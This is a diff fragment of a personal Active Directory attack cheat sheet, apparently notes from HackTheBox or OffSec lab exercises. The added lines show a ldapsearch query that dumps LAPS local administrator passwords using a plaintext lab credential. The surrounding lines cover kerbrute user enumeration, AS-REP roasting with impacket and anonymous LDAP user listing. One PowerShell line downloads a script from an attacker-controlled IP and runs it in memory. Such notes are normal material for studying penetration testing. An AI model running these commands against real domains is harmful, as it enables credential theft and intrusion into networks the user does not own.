@@ -5,7 +5,11 @@ kerbrute userenum [USERFILE] --dc [IP] -d [Domain.com]
 impacket-GetNPUsers -request -dc-ip 10.10.10.161 htb.local/
 
 #Search user on ldpa
-ldapsearch -x -h 192.168.149.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName 
+ldapsearch -x -h 192.168.149.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName
+
+#Search admin password
+ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -h 192.168.120.108 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+****note: LAPS periodically changes the local administrator's password when it expires, but only if password expires!
 
 #Attacking the SPN:
     0. powershell IEX(New-Object Net.Webclient).DownloadString("http://192.168.49.170/GetUserSPNs.ps1")
